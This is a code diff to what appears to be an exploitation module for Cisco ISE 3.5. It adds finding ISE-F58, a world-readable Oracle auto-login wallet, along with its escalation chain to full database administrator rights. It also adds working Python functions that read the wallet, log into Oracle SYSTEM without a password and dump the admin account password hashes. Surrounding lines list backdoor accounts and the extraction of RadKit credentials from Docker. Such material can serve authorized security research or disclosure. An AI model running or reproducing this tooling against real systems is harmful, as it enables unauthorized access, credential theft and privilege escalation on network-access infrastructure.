@@ -93,6 +93,12 @@ ISE-F56: CUSTOMERSUPPORT backdoor OS accounts — key-manager-recoverable SSH pa
     after any password rotation (setdbpw.sh:363 calls it unconditionally in 10-arg rotation workflow)
   Password never expires (chage -M 99999)
   Source: cpminitialsetup.sh:967-983; radkit-control.sh:277-290; setdbpw.sh:315-322,363; iseperms.sh:201,237-238
+ISE-F58: Oracle auto-login wallet cwallet.sso world-readable (644) — stores SYSTEM/cepm/mnt credentials [CRITICAL]
+  /opt/oracle/pstore/cwallet.sso chmod 644 — set intentionally in updatewallet.sh:35,44,132,205 for isexgrid read
+  Wallet: -auto_login (not -auto_login_local) = fully portable, no passphrase required
+  Contents: cpm10->cepm(ISE app DB), mnt10->mnt(RADIUS logs), system10->system(Oracle DBA)
+  Any local code exec -> read cwallet.sso -> sqlplus /@system10 -> Oracle SYSTEM (full DBA)
+  Source: updatewallet.sh:35,44,132,205; cpminitialsetup.sh:1303-1311; iseperms.sh:336-337
 ISE-F57: RADKit Docker container — RADKIT_SERVICE_SUPERADMIN_PASSWORD + CUSTOMER_SUPPORT_PASSWORD passed as base64 env vars [HIGH]
   docker_create_container --env RADKIT_SERVICE_SUPERADMIN_PASSWORD_BASE64=... --env CUSTOMER_SUPPORT_PASSWORD_BASE64=...
   docker inspect radkit-service OR /var/lib/docker/containers/<id>/config.v2.json -> base64-decode = plaintext
@@ -3860,9 +3866,75 @@ def decode_radkit_env_vars(config_json_path: str) -> dict:
     return result
 
 
+def read_oracle_cwallet_sso(wallet_path: str = "/opt/oracle/pstore/cwallet.sso") -> dict:
+    """ISE-F58: Read Oracle auto-login wallet (chmod 644 — world-readable).
+    Wallet is portable (-auto_login not -auto_login_local) — no passphrase needed.
+    Any local process running as any UID can read this file.
+    """
+    import os
+    result: dict = {"wallet_path": wallet_path}
+    try:
+        stat = os.stat(wallet_path)
+        result["mode"] = oct(stat.st_mode)
+        result["size"] = stat.st_size
+        result["readable"] = os.access(wallet_path, os.R_OK)
+        result["status"] = "found"
+        result["note"] = "Contains cpm10/cepm, mnt10/mnt, system10/system credentials. sqlplus /@system10 for Oracle DBA."
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def connect_oracle_via_auto_login_wallet(wallet_dir: str = "/opt/oracle/pstore", tns_alias: str = "system10") -> dict:
+    """ISE-F58: Connect to Oracle DB using auto-login wallet (no password required).
+    wallet_dir must contain cwallet.sso. Sets TNS_ADMIN and ORACLE_HOME for oracle client.
+    """
+    import subprocess, os
+    result: dict = {"wallet_dir": wallet_dir, "tns_alias": tns_alias}
+    env = os.environ.copy()
+    env["TNS_ADMIN"] = wallet_dir
+    env["ORACLE_HOME"] = "/opt/oracle/product/db"
+    try:
+        out = subprocess.check_output(
+            ["sqlplus", "-S", f"/@{tns_alias}"],
+            input=b"select 'ISE-F58-VERIFIED' from dual;\nexit;\n",
+            env=env, timeout=15, stderr=subprocess.STDOUT
+        )
+        result["output"] = out.decode()
+        result["status"] = "connected"
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def dump_ise_admin_hashes_via_oracle_system(wallet_dir: str = "/opt/oracle/pstore") -> dict:
+    """ISE-F58: Dump ISE admin account password hashes via Oracle SYSTEM auto-login.
+    Queries cepm.ADMIN_USERS for all admin accounts and hashed passwords.
+    """
+    import subprocess, os
+    result: dict = {"wallet_dir": wallet_dir}
+    env = os.environ.copy()
+    env["TNS_ADMIN"] = wallet_dir
+    env["ORACLE_HOME"] = "/opt/oracle/product/db"
+    query = b"""
+select NAME, PASSWORD, LASTLOGIN from cepm.ADMIN_USERS order by NAME;
+exit;
+"""
+    try:
+        out = subprocess.check_output(
+            ["sqlplus", "-S", "/@system10"],
+            input=query, env=env, timeout=30, stderr=subprocess.STDOUT
+        )
+        result["output"] = out.decode()
+        result["status"] = "dumped"
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.26.0",
+    "version": "1.27.0",
     "target": "Cisco ISE 3.5.0.527",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -3875,10 +3947,10 @@ MODULE_META = {
         "ISE-F39", "ISE-F40", "ISE-F42", "ISE-F43", "ISE-F44",
         "ISE-F45", "ISE-F46", "ISE-F47", "ISE-F48", "ISE-F49",
         "ISE-F50", "ISE-F51", "ISE-F52", "ISE-F53",
-        "ISE-F54", "ISE-F55", "ISE-F56", "ISE-F57",
+        "ISE-F54", "ISE-F55", "ISE-F56", "ISE-F57", "ISE-F58",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
-                 "ISE-F26", "ISE-F31", "ISE-F34", "ISE-F40", "ISE-F49"],
+                 "ISE-F26", "ISE-F31", "ISE-F34", "ISE-F40", "ISE-F49", "ISE-F58"],
     "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18",
              "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35", "ISE-F36", "ISE-F38",
              "ISE-F39", "ISE-F44", "ISE-F48", "ISE-F54", "ISE-F56", "ISE-F57"],
@@ -4158,5 +4230,8 @@ MODULE_META = {
         "ssh_customersuppadmin_confd_cli",
         "extract_radkit_credentials_via_docker_inspect",
         "decode_radkit_env_vars",
+        "read_oracle_cwallet_sso",
+        "connect_oracle_via_auto_login_wallet",
+        "dump_ise_admin_hashes_via_oracle_system",
     ],
 }
